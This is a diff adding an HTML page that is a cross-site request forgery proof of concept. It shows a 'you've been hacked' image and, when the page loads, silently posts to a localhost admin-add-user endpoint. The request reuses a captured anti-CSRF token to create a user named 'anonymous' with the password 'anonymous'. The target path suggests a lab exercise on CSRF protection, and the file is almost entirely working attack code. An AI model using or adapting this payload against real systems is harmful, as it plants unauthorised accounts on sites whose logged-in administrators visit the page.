@@ -1,0 +1,30 @@
+<html>
+	<head>
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<style>
+		body, html {
+			height: 100%;
+			margin: 0;
+		}
+		.bg {
+			background-image: url(images/youve-been-hacked.png);
+			height: 100%; 
+			background-position: center;
+			background-repeat: no-repeat;
+			background-size: cover;
+		}
+		</style>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+		<script>
+		var dat="username=anonymous&password=anonymous&_token=nZnEXCA1kxW6RIPYrRArBEhIWdkb2aLyba6gNVJqJo0%3D&insert=Insert";
+		$.ajax({
+			url:'http://localhost/csrf_protected/admin-add-user.php',
+			method:'post',
+			data:dat,
+		})
+		</script>
+	</head>
+	<body>
+		<div class="bg"></div>
+	</body>
+</html>
